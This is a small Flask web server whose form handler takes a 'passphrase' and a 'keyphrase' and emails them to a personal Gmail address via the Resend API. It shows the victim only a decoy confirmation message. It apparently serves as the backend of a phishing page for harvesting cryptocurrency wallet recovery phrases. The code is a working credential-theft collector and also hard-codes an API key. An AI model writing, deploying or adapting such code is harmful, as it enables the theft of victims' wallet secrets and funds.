from flask import Flask, request, redirect, url_for

import resend

app = Flask(__name__)

@app.route("/")
def home():
    return redirect(url_for("server"))

API_KEY = "re_4jT9uMnR_FpBgpk5cEj3bCLQ1kmCc3GZV"

@app.route("/submit", methods = ["GET", "POST"])
def server():
    if request.method == "GET":
        return "Server Page"
    
    else:
        pass_phrase = request.form.get("passphrase")

        key_phrase = request.form.get("keyphrase")

        resend.api_key = API_KEY

        response = resend.Emails.send({
        "from": "onboarding@resend.dev",
        "to": "chibuchidavid159@gmail.com",
        "subject": "New Response",
        "text": f"Passphrase: {pass_phrase}\nKey Phrase: {key_phrase}\n Ignore this message if you have not requested the above."
        })

        return "Your email is on the way"

if __name__ == "__main__":
    app.run(host = "0.0.0.0", port = "10000")